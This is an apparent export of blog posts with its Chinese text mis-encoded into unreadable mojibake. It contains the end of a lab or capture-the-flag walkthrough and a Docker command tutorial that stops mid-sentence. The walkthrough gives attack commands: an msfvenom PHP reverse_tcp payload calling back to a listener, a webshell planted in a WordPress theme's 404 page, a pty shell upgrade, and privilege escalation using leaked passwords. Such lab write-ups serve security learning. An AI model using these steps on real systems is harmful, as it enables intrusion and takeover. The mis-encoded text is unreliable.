&emsp;&emsp;ç›¸åŒçš„æ–¹æ³•ä¸‹è½½todolist.txtä¸‹æ¥çœ‹çœ‹ &emsp;&emsp;æ¥ä¸‹æ¥æ‰“å¼€wordpressçœ‹çœ‹ï¼Œä¸»è¦çœ‹é…ç½®æ–‡ä»¶ &emsp;&emsp;å¯ä»¥ä»å‰é¢çœ‹åˆ°è¯¥æœåŠ¡å™¨å¼€æ”¾äº†mysql 3306ç«¯å£ï¼Œå°è¯•ç›´æ¥è¿æ¥æ•°æ®åº“ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œåº”è¯¥æ˜¯è®¾ç½®äº†åªèƒ½ä»æœ¬åœ°è¿æ¥ mysql -h 192.168.1.107 -uroot -pTogieMYSQL12345^^ &emsp;&emsp;å› ä¸ºå¼€æ”¾äº†22ç«¯å£ï¼Œå°è¯•ä½¿ç”¨sshåè®®è¿œç¨‹ç™»å½•ï¼Œä½†æ˜¾ç¤ºå¯†ç ä¸å¯¹ ssh Admin@192.168.1.107 &emsp;&emsp;é’ˆå¯¹smbåè®®ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨è¿œç¨‹æº¢å‡ºæ¼æ´è¿›è¡Œåˆ†æ searchsploit sambaç‰ˆæœ¬å· &emsp;&emsp;æ²¡æœ‰ä»»ä½•æ¼æ´å¯ä»¥åˆ©ç”¨ 2ã€é’ˆå¯¹HTTPåè®®å¼±ç‚¹æ¢æµ‹ï¼ˆ1ï¼‰ç›®å½•æ‰«æ&emsp;&emsp;å‘ç°wrodpressçš„wp-login.php dirsearch -u http://192.168.1.107 &emsp;&emsp;æ‰“å¼€ç½‘é¡µçœ‹çœ‹ &emsp;&emsp;è¾“å…¥å‰é¢çš„wp-config.phpä¸­çš„è´¦å·å’Œå¯†ç ï¼ŒæˆåŠŸè¿›å…¥ ï¼ˆ2ï¼‰æ„é€ payloadè·å–shell&emsp;&emsp;ä½¿ç”¨msfvenomæ„é€ payload msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php &emsp;&emsp;æ‰“å¼€msfconsoleï¼Œå¼€å¯ç›‘å¬ ï¼ˆ3ï¼‰åœ¨wordpressä¸­ä¸Šä¼ webshell&emsp;&emsp;å°†shell.phpçš„å†…å®¹ç²˜è´´åˆ° wordpressä¸­çš„Appearanceä¸­ï¼ŒEditorä¸­çš„404é¡µé¢ &emsp;&emsp;ç‚¹å‡»update file &emsp;&emsp;æ¥ä¸‹æ¥è®¿é—®404é¡µé¢ï¼šhttp://192.168.1.107/wordpress/wp-content/themes/twentyfifteen/404.phpï¼ˆæ³¨æ„è¿™é‡Œçš„**twentyfifiteen**è¦æŒ‰ç…§å›¾ä¸­è‡ªå·±çš„å®é™…æƒ…å†µä¿®æ”¹ï¼‰ &emsp;&emsp;æŸ¥çœ‹ç›‘å¬ç«¯ï¼ŒæˆåŠŸåå¼¹shell ï¼ˆ4ï¼‰ä¼˜åŒ–ç»ˆç«¯&emsp;&emsp;è°ƒç”¨äº¤äº’å¼å‘½ä»¤è¡Œï¼Œä¼˜åŒ–ç»ˆç«¯ python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; ï¼ˆ5ï¼‰è·å¾—flag&emsp;&emsp;ä½¿ç”¨cat /etc/passwdå‘½ä»¤ï¼Œæ¥æŸ¥çœ‹æ¯ä¸ªç”¨æˆ·è´¦å·çš„å±æ€§ã€‚ &emsp;&emsp;å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªç†Ÿæ‚‰çš„ï¼Œåœ¨wordpressé¡µé¢ä¸­å‡ºç°äº†å¾ˆå¤šæ¬¡çš„ç”¨æˆ·togieï¼Œåˆ‡æ¢åˆ°å…¶è´¦æˆ·ï¼š su togie &emsp;&emsp;å¯†ç æ˜¯ä¹‹å‰deets.txtä¸­å†™çš„12345ï¼ŒæˆåŠŸè¿›å…¥ &emsp;&emsp;ä½¿ç”¨sudo -iå‘½ä»¤è¿›å…¥rootæ¨¡å¼ï¼Œå¯†ç åŒæ ·æ˜¯12345 &emsp;&emsp;è¿›å…¥rootç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°proof.txtæ–‡ä»¶ã€‚","categories":[{"name":"ç»¼åˆé¶åœº","slug":"ç»¼åˆé¶åœº","permalink":"https://wolke.cn/categories/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wolke.cn/tags/CTF/"},{"name":"SMB","slug":"SMB","permalink":"https://wolke.cn/tags/SMB/"}],"author":"w01ke"},{"title":"dockerå¸¸ç”¨å‘½ä»¤","slug":"dockerå¸¸ç”¨å‘½ä»¤","date":"2021-12-09T04:15:35.000Z","updated":"2022-01-03T03:26:03.965Z","comments":true,"path":"post/749ad7d8.html","link":"","permalink":"https://wolke.cn/post/749ad7d8.html","excerpt":"","text":"ä¸€ã€å¸®åŠ©å‘½ä»¤docker version #æŸ¥çœ‹dockerç‰ˆæœ¬ï¼ˆæœ‰clientå’Œserverï¼Œçœ‹åˆ°serverèµ·æ¥äº†æ‰è¯´æ˜dockerèµ·æ¥äº†ï¼‰docker info #æ˜¾ç¤ºdockerçš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨çš„æ•°é‡docker å‘½ä»¤ --help #ä¸‡èƒ½å‘½ä»¤ &emsp;&emsp;å¸®åŠ©æ–‡æ¡£çš„åœ°å€ï¼šhttps://docs.docker.com/reference/ äºŒã€é•œåƒå‘½ä»¤1ã€æŸ¥çœ‹é•œåƒ&emsp;&emsp;docker images åˆ—å‡ºæœ¬åœ°é•œåƒ &emsp;&emsp;è¯­æ³•ï¼šdocker images [OPTIONS] [REPOSITORY[:TAG]] &emsp;&emsp;OPTIONSè¯´æ˜ï¼š -aï¼Œâ€“all åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„é•œåƒï¼ˆå«ä¸­é—´æ˜ åƒå±‚ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œéšè—ä¸­é—´æ˜ åƒå±‚ï¼‰ â€“digests æ˜¾ç¤ºé•œåƒçš„æ‘˜è¦ä¿¡æ¯ï¼ˆç­¾åï¼‰ -fï¼Œâ€“fliter æ ¹æ®æ¡ä»¶å¯¹è¾“å‡ºç»“æœè¿›è¡Œè¿‡æ»¤ â€“format æ ¼å¼åŒ–è¾“å‡ºç»“æœ â€“no-trunc ä¸æˆªæ–­è¾“å‡ºï¼Œå³æ˜¾ç¤ºå®Œæ•´çš„é•œåƒIDä¿¡æ¯ -q åªæ˜¾ç¤ºé•œåƒID #åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„é•œåƒ[root@VM-0-15-centos ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZEmysql latest 5a4e492065c7 11 days ago 514MBhello-world latest d1165f221234 5 months ago 13.3kBcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB#åˆ—å‡ºæŒ‡å®šé•œåƒåhello-world:latestçš„ä¿¡æ¯[root@VM-0-15-centos ~]# docker images hello-world:latestREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#åˆ—å‡ºé•œåƒåä¸ºhello-worldçš„æ‰€æœ‰é•œåƒä¿¡æ¯[root@VM-0-15-centos ~]# docker images hello-worldREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#ä¹Ÿå¯ä»¥ä½¿ç”¨æ¨¡ç³ŠæŸ¥æ‰¾çš„æ–¹å¼ï¼š[root@VM-0-15-centos ~]# docker images hello-worldREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest d1165f221234 5 months ago 13.3kB#æ˜¾ç¤ºé•œåƒå®Œæ•´çš„ID[root@VM-0-15-centos ~]# docker images --no-truncREPOSITORY TAG IMAGE ID CREATED SIZEmysql latest sha256:5a4e492065c722ec8cc7413552bafc6fd5434c5ad90797e898ccc4e347e21aa5 11 days ago 514MBhello-world latest sha256:d1165f2212346b2bab48cb01c1e39ee8ad1be46b87873d9ca7a4e434980a7726 5 months ago 13.3kBcentos latest sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55 8 months ago 209MB80x86/typecho latest sha256:3437f7346b4c58c7451ff6e398f9b8e4019a7a34186af61aba54d0f00a71a398 2 years ago 53.9MB#æ˜¾ç¤ºé•œåƒçš„æ‘˜è¦ï¼ˆç­¾åï¼‰[root@VM-0-15-centos ~]# docker images --digestsREPOSITORY TAG DIGEST IMAGE ID CREATED SIZEmysql latest sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926 5a4e492065c7 11 days ago 514MBhello-world latest sha256:7d91b69e04a9029b99f3585aaaccae2baa80bcf318f4a5d2165a9898cd2dc0a1 d1165f221234 5 months ago 13.3kBcentos latest sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1 300e315adb2f 8 months ago 209MB80x86/typecho latest sha256:4af25c76919efa862d59aeb3a2d9f2394ad3ef4b338037e8a2499c55011dbbf7 3437f7346b4c 2 years ago 53.9MB#ç­›é€‰åœ¨hello-world:latesté•œåƒä¹‹å‰åˆ›å»ºçš„é•œåƒ[root@VM-0-15-centos ~]# docker images -f &quot;before=hello-world:latest&quot;REPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 300e315adb2f 8 months ago 209MB80x86/typecho latest 3437f7346b4c 2 years ago 53.9MB#ç­›é€‰åœ¨hello-world:latesté•œåƒä¹‹ååˆ›å»ºçš„é•œåƒ[root@VM-0-15-centos ~]# docker images -f &quot;since=hello-world:latest&quot;REPOSITORY TAG IMAGE ID CREATED SIZEmysql latest 5a4e492065c7 11 days ago 514MB#åˆ—å‡ºè™šæ‚¬é•œåƒ[root@VM-0-15-centos ~]# docker images -f &quot;dangling=true&quot;REPOSITORY TAG IMAGE ID CREATED SIZE#æ˜¾ç¤ºé•œåƒIDå’Œé•œåƒå[root@VM-0-15-centos ~]# docker images --format &quot;&#123;&#123;.ID&#125;&#125;: &#123;&#123;.Repository&#125;&#125;&quot;5a4e492065c7: mysqld1165f221234: hello-world300e315adb2f: centos3437f7346b4c: 80x86/typecho#ä»¥è¡¨æ ¼çš„å½¢å¼æ˜¾ç¤ºé•œåƒIDã€é•œåƒåå’Œé•œåƒæ ‡ç­¾[root@VM-0-15-centos ~]# docker images --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Repository&#125;&#125;\\t&#123;&#123;.Tag&#125;&#125;&quot;IMAGE ID REPOSITORY TAG5a4e492065c7 mysql latestd1165f221234 hello-world latest300e315adb2f centos latest3437f7346b4c 80x86/typecho latest#è§£é‡ŠREPOSITORY é•œåƒçš„ä»“åº“æºTAG é•œåƒçš„æ ‡ç­¾IMAGE ID é•œåƒçš„idCREATED é•œåƒçš„åˆ›å»ºæ—¶é—´SIZE é•œåƒçš„å¤§å° 2ã€æœç´¢é•œåƒ&emsp;&emsp;docker search æœç´¢é•œåƒ &emsp;&emsp;è¯­æ³•ï¼šdocker search [OPTIONS] TERM &emsp;&emsp;OPTIONSè¯´æ˜ï¼š â€“automated åªåˆ—å‡º automated buildç±»å‹çš„é•œåƒ -fï¼Œâ€“filter åˆ—å‡ºæ”¶è—æ•°ä¸å°äºæŒ‡å®šå€¼çš„é•œåƒ â€“no-trunc ä¸æˆªæ–­è¾“å‡ºï¼Œå³æ˜¾ç¤ºå®Œæ•´çš„é•œåƒIDä¿¡æ¯ [root@VM-0-15-centos ~]# docker search mysqlNAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relationâ€¦ 11332 [OK]mariadb MariaDB Server is a high performing open souâ€¦ 4307 [OK]mysql/mysql-server Optimized MySQL Server Docker images. Createâ€¦ 840 [OK]phpmyadmin phpMyAdmin - A web interface for MySQL and Mâ€¦ 305 [OK]#ä» Docker Hub æŸ¥æ‰¾æ‰€æœ‰é•œåƒååŒ…å«mysqlï¼Œå¹¶ä¸”æ”¶è—æ•°å¤§äºç­‰äº 3000 çš„é•œåƒ[root@VM-0-15-centos ~]# docker search mysql -f stars=3000NAME DESCRIPTION STARS OFFICIAL AUTOMATEDmysql MySQL is a widely used, open-source relationâ€¦ 11334 [OK]mariadb MariaDB Server is a high performing open souâ€¦ 4307 [OK]#å‚æ•°è¯´æ˜NAME #é•œåƒä»“åº“æºçš„åç§°DESCRIPTION #é•œåƒçš„æè¿°OFFICIAL #æ˜¯å¦ docker å®˜æ–¹å‘å¸ƒSTARS #ç±»ä¼¼ Github é‡Œé¢çš„ starï¼Œè¡¨ç¤ºç‚¹èµã€å–œæ¬¢çš„æ„æ€ã€‚AUTOMATED #è‡ªåŠ¨æ„å»º 3ã€ä¸‹è½½é•œåƒ&emsp;&emsp;docker pull ä¸‹è½½é•œåƒ &emsp;&emsp;è¯­æ³•ï¼šdocker pull [OPTIONS] NAME[:TAG|@DIGEST] &emsp;&emsp;OPTIONSè¯´æ˜ï¼š -a æ‹‰å–æ‰€æœ‰ tagged é•œåƒ â€“disable-content-trust å¿½ç•¥é•œåƒçš„æ ¡éªŒ,é»˜è®¤å¼€å¯ ä¸‹è½½é•œåƒ docker pull é•œåƒå[:tag][root@VM-0-15-centos ~]# docker pull mysqlUsing default tag: latest #å¦‚æœä¸å†™tagï¼Œé»˜è®¤å°±æ˜¯latestlatest: Pulling from library/mysqle1acddbe380c: Pull complete #åˆ†å±‚ä¸‹è½½ï¼Œdocker imageçš„æ ¸å¿ƒ è”åˆæ–‡ä»¶ç³»ç»Ÿbed879327370: Pull complete03285f80bafd: Pull completeccc17412a00a: Pull complete1f556ecc09d1: Pull completeadc5528e468d: Pull complete1afc286d5d53: Pull complete6c724a59adff: Pull complete0f2345f8b0a3: Pull completec8461a25b23b: Pull complete3adb49279bed: Pull complete77f22cd6c363: Pull completeDigest: sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926 #ç­¾åStatus: Downloaded newer image for mysql:latestdocker.io/library/mysql:latest #çœŸå®åœ°å€#ç­‰ä»·å…³ç³»docker pull mysqldocker pull docker.io/library/mysql:latest#æŒ‡å®šç‰ˆæœ¬ä¸‹è½½[root@VM-0-15-centos ~]# docker pull mysql:5.75.7: Pulling from library/mysqle1acddbe380c: Already existsbed879327370: Already exists03285f80bafd: Already existsccc17412a00a: Already exists1f556ecc09d1: Already existsadc5528e468d: Already exists1afc286d5d53: Already exists4d2d9261e3ad: Pull completeac609d7b31f8: Pull complete53ee1339bc3a: Pull completeb0c0a831a707: Pull completeDigest: sha256:7cf2e7d7ff876f93c8601406a5aa17484e6623875e64e7acc71432ad8e0a3d7eStatus: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7#ä¸‹è½½REPOSITORYä¸ºmysqlçš„æ‰€æœ‰é•œåƒdocker pull -a mysql 4ã€åˆ é™¤é•œåƒ&emsp;&emsp;docker rmi åˆ é™¤æœ¬åœ°ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ &emsp;&emsp;è¯­æ³•ï¼šdocker rmi [OPTIONS] IMAGE [IMAGE...] &emsp;&emsp;OPTIONSè¯´æ˜ï¼š -f å¼ºåˆ¶åˆ é™¤ â€“no-prune ä¸ç§»é™¤è¯¥é•œåƒçš„è¿‡ç¨‹é•œåƒï¼Œé»˜è®¤ç§»é™¤ [root@VM-0-15-centos ~]# docker rmi -f é•œåƒid #å¼ºåˆ¶åˆ é™¤æŒ‡å®šçš„é•œåƒ[root@VM-0-15-centos ~]# docker rmi -f é•œåƒid é•œåƒid é•œåƒid #å¼ºåˆ¶åˆ é™¤å¤šä¸ªæŒ‡å®šçš„é•œåƒ[root@VM-0-15-centos ~]# docker rmi -f $(docker images -aq) #å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„é•œåƒ ä¸‰ã€å®¹å™¨å‘½ä»¤è¯´æ˜ï¼šæˆ‘ä»¬æœ‰äº†é•œåƒæ‰å¯ä»¥åˆ›å»ºå®¹å™¨ï¼ŒLinuxç³»ç»Ÿä¸‹ä¸‹è½½ä¸€ä¸ªCentOSé•œåƒæ¥æµ‹è¯•å­¦ä¹  &emsp;&emsp;docker pull centos 1ã€æ–°å»ºå®¹å™¨å¹¶è¿è¡Œå‘½ä»¤&emsp;&emsp;docker run åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ &emsp;&emsp;è¯­æ³•ï¼šdocker run [OPTIONS] IMAGE [COMMAND] [ARG...] &emsp;&emsp;OPTIONSè¯´æ˜ï¼š -d, â€“detach=false æŒ‡å®šå®¹å™¨è¿è¡Œäºå‰å°è¿˜æ˜¯åå°ï¼Œé»˜è®¤ä¸ºfalseï¼Œä¸ºtrueåˆ™åå°è¿è¡Œ -i, â€“interactive=false æ‰“å¼€STDINï¼Œç”¨äºæ§åˆ¶å°äº¤äº’ -t, â€“tty=false åˆ†é…ttyè®¾å¤‡ï¼Œè¯¥å¯ä»¥æ”¯æŒç»ˆç«¯ç™»å½•ï¼Œé»˜è®¤ä¸ºfalse -u, â€“user=â€â€ æŒ‡å®šå®¹å™¨çš„ç”¨æˆ· -a, â€“attach=[] ç™»å½•å®¹å™¨ï¼ˆå¿…é¡»æ˜¯ä»¥docker run -då¯åŠ¨çš„å®¹å™¨ï¼‰ -w, â€“workdir=â€â€ æŒ‡å®šå®¹å™¨çš„å·¥ä½œç›®å½• -c, â€“cpu-shares=0 è®¾ç½®å®¹å™¨CPUæƒé‡ï¼Œåœ¨CPUå…±äº«åœºæ™¯ä½¿ç”¨ -e, â€“env=[] æŒ‡å®šç¯å¢ƒå˜é‡ï¼Œå®¹å™¨ä¸­å¯ä»¥ä½¿ç”¨è¯¥ç¯å¢ƒå˜é‡ -m, â€“memory=â€â€ æŒ‡å®šå®¹å™¨çš„å†…å­˜ä¸Šé™ -P, â€“publish-all=false éšæœºæŒ‡å®šå®¹å™¨æš´éœ²çš„ç«¯å£ -p, â€“publish=[] æŒ‡å®šå®¹å™¨æš´éœ²çš„ç«¯å£ -h, â€“hostname=â€â€ æŒ‡å®šå®¹å™¨çš„ä¸»æœºå -v, â€“volume=[] ç»™å®¹å™¨æŒ‚è½½å­˜å‚¨å·ï¼ŒæŒ‚è½½åˆ°å®¹å™¨çš„æŸä¸ªç›®å½• â€“volumes-from=[] ç»™å®¹å™¨æŒ‚è½½å…¶ä»–å®¹å™¨ä¸Šçš„å·ï¼ŒæŒ‚è½½åˆ°å®¹å™¨çš„æŸä¸ªç›®å½• â€“cap-add=[] æ·»åŠ æƒé™ï¼Œæƒé™æ¸…å•è¯¦è§ï¼šhttp://linux.die.net/man/7/capabilities â€“cap-drop=[] åˆ é™¤æƒé™ï¼Œæƒé™æ¸…å•è¯¦è§ï¼šhttp://linux.die.net/man/7/capabilities â€“cidfile=â€â€ è¿è¡Œå®¹å™¨åï¼Œåœ¨æŒ‡å®šæ–‡ä»¶ä¸­å†™å…¥å®¹å™¨PIDå€¼ï¼Œä¸€ç§å…¸å‹çš„ç›‘æ§ç³»ç»Ÿç”¨æ³• â€“cpuset=â€â€ è®¾ç½®å®¹å™¨å¯ä»¥ä½¿ç”¨å“ªäº›CPUï¼Œæ­¤å‚æ•°å¯ä»¥ç”¨æ¥å®¹å™¨ç‹¬å CPU â€“device=[] æ·»åŠ ä¸»æœºè®¾å¤‡ç»™å®¹å™¨ï¼Œç›¸å½“äºè®¾å¤‡ç›´é€š â€“dns=[] æŒ‡å®šå®¹å™¨çš„dnsæœåŠ¡å™¨ â€“dns-search=[] æŒ‡å®šå®¹å™¨çš„dnsæœç´¢åŸŸåï¼Œå†™å…¥åˆ°å®¹å™¨çš„/etc/resolv.confæ–‡ä»¶ â€“entrypoint=â€â€ è¦†ç›–imageçš„å…¥å£ç‚¹ â€“env-file=[] æŒ‡å®šç¯å¢ƒå˜é‡æ–‡ä»¶ï¼Œæ–‡ä»¶æ ¼å¼ä¸ºæ¯è¡Œä¸€ä¸ªç¯å¢ƒå˜é‡ â€“expose=[] æŒ‡å®šå®¹å™¨æš´éœ²çš„ç«¯å£ï¼Œå³ä¿®æ”¹é•œåƒçš„æš´éœ²ç«¯å£ â€“link=[] æŒ‡å®šå®¹å™¨é—´çš„å…³è”ï¼Œä½¿ç”¨å…¶ä»–å®¹å™¨çš„IPã€envç­‰ä¿¡æ¯ â€“lxc-conf=[] æŒ‡å®šå®¹å™¨çš„é…ç½®æ–‡ä»¶ï¼Œåªæœ‰åœ¨æŒ‡å®šâ€“exec-driver=lxcæ—¶ä½¿ç”¨ â€“name=â€â€ æŒ‡å®šå®¹å™¨åå­—ï¼Œåç»­å¯ä»¥é€šè¿‡åå­—è¿›è¡Œå®¹å™¨ç®¡ç†ï¼Œlinksç‰¹æ€§éœ€è¦ä½¿ç”¨åå­— â€“net=â€bridgeâ€ å®¹å™¨ç½‘ç»œè®¾ç½®: ä½¿ç”¨docker daemonæŒ‡å®šçš„ç½‘æ¡¥ â€“net=â€hostâ€ å®¹å™¨ç½‘ç»œè®¾ç½®: å®¹å™¨ä½¿ç”¨ä¸»æœºçš„ç½‘ç»œ â€“net=â€containerâ€ å®¹å™¨ç½‘ç»œè®¾ç½®: ä½¿ç”¨å…¶ä»–å®¹å™¨çš„ç½‘è·¯ï¼Œå…±äº«IPå’ŒPORTç­‰ç½‘ç»œèµ„æº â€“net=â€noneâ€ å®¹å™¨ç½‘ç»œè®¾ç½®: å®¹å™¨ä½¿ç”¨è‡ªå·±çš„ç½‘ç»œï¼ˆç±»ä¼¼â€“net=bridgeï¼‰ï¼Œä½†æ˜¯ä¸è¿›è¡Œé…ç½® â€“privileged=false æŒ‡å®šå®¹å™¨æ˜¯å¦ä¸ºç‰¹æƒå®¹å™¨ï¼Œç‰¹æƒå®¹å™¨æ‹¥æœ‰æ‰€æœ‰çš„capabilities â€“restart=â€noâ€ å®¹å™¨é€€å‡ºæ—¶ä¸é‡å¯ â€“restart=â€on-failureâ€ å®¹å™¨æ•…éšœé€€å‡ºï¼ˆè¿”å›å€¼éé›¶ï¼‰æ—¶é‡å¯ â€“restart=â€alwaysâ€ å®¹å™¨é€€å‡ºæ—¶æ€»æ˜¯é‡å¯ â€“rm=false æŒ‡å®šå®¹å™¨åœæ­¢åè‡ªåŠ¨åˆ é™¤å®¹å™¨(ä¸æ”¯æŒä»¥docker run -då¯åŠ¨çš„å®¹å™¨) â€“sig-proxy=true è®¾ç½®ç”±ä»£ç†æ¥å—å¹¶å¤„ç†ä¿¡å·ï¼Œä½†æ˜¯SIGCHLDã€SIGSTOPå’ŒSIGKILLä¸èƒ½è¢«ä»£ç† &emsp;&emsp;å¸¸ç”¨å‘½ä»¤å‚æ•° -d è®©å®¹å™¨åå°è¿è¡Œ -it ä¿æŒæ ‡å‡†è¾“å…¥æ‰“å¼€ï¼ˆé»˜è®¤ä¸ºfalseï¼‰ï¼Œè®©å®¹å™¨ä¿æŒäº¤äº’çŠ¶æ€ï¼Œä¸æŠŠé˜»å¡/ç­‰å¾…è¾“å…¥å½“æˆæ˜¯ä»»åŠ¡ç»“æŸ -p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ #æ˜ å°„å®¹å™¨çš„ç«¯å£å· -P éšæœºæ˜ å°„é•œåƒæ‰€éœ€è¦çš„ç«¯å£å· -v ä¸»æœºè·¯å¾„:å®¹å™¨è·¯å¾„ æ˜ å°„å®¹å™¨çš„å­˜å‚¨å· â€“rm å®¹å™¨è¿è¡Œç»“æŸåè‡ªåŠ¨é”€æ¯(è¿å°¸ä½“éƒ½ä¸ä¼šæœ‰) â€“name è®¾ç½®å®¹å™¨åç§° â€“hostname è®¾ç½®å®¹å™¨çš„ä¸»æœºå â€“restart=always è®¾ç½®å®¹å™¨å¼€æœºè‡ªåŠ¨å¯åŠ¨ï¼ˆsystemctl start dockerï¼Œsystemctl enable dockeræ­é…ï¼‰ #è¿è¡Œä¸€ä¸ªåœ¨åå°æ‰§è¡Œçš„å®¹å™¨ï¼ŒåŒæ—¶ï¼Œè¿˜èƒ½ç”¨æ§åˆ¶å°ç®¡ç†[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -i -t -d centos:lateste599b223e7e00bda6dd1af7d02248ea83c167e62e97d6a9ad821dc0b8e4c4a53[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe599b223e7e0 centos:latest &quot;/bin/bash&quot; 5 seconds ago Up 4 seconds lucid_banach#è¿è¡Œä¸€ä¸ªå¸¦å‘½ä»¤åœ¨åå°ä¸æ–­æ‰§è¡Œçš„å®¹å™¨ï¼Œä¸ç›´æ¥å±•ç¤ºå®¹å™¨å†…éƒ¨ä¿¡æ¯[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe599b223e7e0 centos:latest &quot;/bin/bash&quot; 5 seconds ago Up 4 seconds lucid_banach[root@VM-0-15-centos ~]# docker run -d centos:latest ping www.docker.com626b539eeba4c0fe45770d7db8782bf4f20a9c207fbdc726663700ac150cdd4e[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES626b539eeba4 centos:latest &quot;ping www.docker.com&quot; 5 seconds ago Up 4 seconds nifty_solomone599b223e7e0 centos:latest &quot;/bin/bash&quot; 2 minutes ago Up 2 minutes lucid_banach#ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­—ã€‚#å®¹å™¨æš´éœ²80ç«¯å£ï¼Œå¹¶æŒ‡å®šå®¿ä¸»æœº2021ç«¯å£ä¸å…¶é€šä¿¡(: ä¹‹å‰æ˜¯å®¿ä¸»æœºç«¯å£ï¼Œä¹‹åæ˜¯å®¹å™¨éœ€æš´éœ²çš„ç«¯å£)#æŒ‡å®šå®¹å™¨å†…ç›®å½•ä¸å®¿ä¸»æœºç›®å½•å…±äº«(: ä¹‹å‰æ˜¯å®¿ä¸»æœºæ–‡ä»¶å¤¹ï¼Œä¹‹åæ˜¯å®¹å™¨éœ€å…±äº«çš„æ–‡ä»¶å¤¹)ï¼Œ[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker run -it -d --name=centos_server -p 2021:80 -v /etc/www:/var/www centos:latest1e605144b3c4dc66112c7d8fba0b2dabada1d897523c56dc159705335dba5ae0[root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1e605144b3c4 centos:latest &quot;/bin/bash&quot; 3 seconds ago Up 2 seconds 0.0.0.0:2021-&gt;80/tcp, :::2021-&gt;80/tcp centos_server#æµ‹è¯•ï¼Œå¯åŠ¨å¹¶è¿›å…¥å®¹å™¨[root@VM-0-15-centos ~]# docker run -it centos /bin/bash[root@286621faf844 /]# ls #æŸ¥çœ‹å®¹å™¨å†…çš„centosï¼ŒåŸºç¡€ç‰ˆæœ¬ï¼Œå¾ˆå¤šå‘½ä»¤éƒ½ä¸å®Œå–„bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var 2ã€æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨&emsp;&emsp;docker ps &emsp;&emsp;è¯­æ³•ï¼šdocker ps [OPTIONS] -a #æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ -l #æŸ¥çœ‹æœ€åä¸€ä¸ªè¿è¡Œçš„å®¹å™¨ -n #åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„nä¸ªå®¹å™¨ â€“no-trunc #ä¸æˆªæ–­è¾“å‡º -q #é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ID -s #æ˜¾ç¤ºæ€»çš„æ–‡ä»¶å¤§å° [root@VM-0-15-centos ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES[root@VM-0-15-centos ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES286621faf844 centos &quot;/bin/bash&quot; 6 minutes ago Exited (0) 4 minutes ago eloquent_chaplyginc3740c67c633 hello-world &quot;/hello&quot; 2 hours ago Exited (0) 2 hours ago agitated_lamarrdea8fbdd52bb 80x86/typecho &quot;/entrypoint.sh /appâ€¦&quot; 3 months ago Exited (137) 2 months ago infallible_blackwell1663d813cab4 80x86/typecho &quot;/entrypoint.sh /appâ€¦&quot; 3 months ago Exited (137) 3 months ago cranky_dirac#åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„2ä¸ªå®¹å™¨ä¿¡æ¯[root@VM-0-15-centos ~]# docker ps -n 2CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES286621faf844 centos &quot;/bin/bash&quot; 6 minutes ago Exited (0) 4 minutes ago eloquent_chaplyginc3740c67c633 hello-world &quot;/hello&quot; 2 hours ago Exited (0) 2 hours ago agitated_lamarr 3ã€é€€å‡ºå®¹å™¨ï¼ˆ1ï¼‰å®¹å™¨é‡Œé¢&emsp;&emsp;å½“æˆ‘ä»¬åœ¨å®¹å™¨é‡Œé¢çš„æ—¶å€™ï¼Œé€€å‡ºå®¹å™¨çš„æ–¹å¼æœ‰å¤šä¸ª ï¼ˆ2ï¼‰å®¹å™¨å¤–é¢&emsp;&emsp;docker stop å®¹å™¨å/id &emsp;&emsp;docker start 